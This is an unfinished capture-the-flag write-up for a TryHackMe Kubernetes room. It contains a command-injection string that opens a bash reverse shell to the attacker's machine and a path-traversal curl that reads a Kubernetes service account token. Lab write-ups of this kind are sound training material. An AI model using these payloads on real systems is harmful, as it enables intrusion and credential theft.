# [THM] - Kubernetes

[Room link](https://tryhackme.com/room/insekube)

--- 

 ## Task 1
 
 1. What ports are open? (comma separated)
  
**No aswer required**

```bash
# Fast scan all ports
$ nmap -sT -p- -T4 10.10.40.83
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Scan details
$ nmap -sC -sV -p22,80 -oN nmap_22-80.txt 10.10.40.83

```

--- 

## Task 2

To get reverse shell, start a listener nc on your machine (nc -lnvp 4444 for example) and put in the box the following string : 
127.0.0.1;bash -i >& /dev/tcp/<your_ip>/4444 0>&1

1. What is flag 1?

```bash
$ env | grep -i flag
$ env | grep -i flag
FLAG=flag{XXXX}
```

---

## Task 3

Install kubectl following the instructions. 

1.

## Task 5

```bash
challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl --path-as-is http://10.105.120.1:3000/public/plugins/alertGroups/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
</var/run/secrets/kubernetes.io/serviceaccount/token
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1022  100  1022    0     0   499k      0 --:--:-- --:--:-- --:--:--  499k
eyJhbGciOiJSUzI1NiIsImtpZCI6IkpwcUhIZ1hyRF9FbGYyQ1piWHNiemZhNGpnSTl0Z3Z1X2dMeFAtTURUaVUifQ[.....]
```
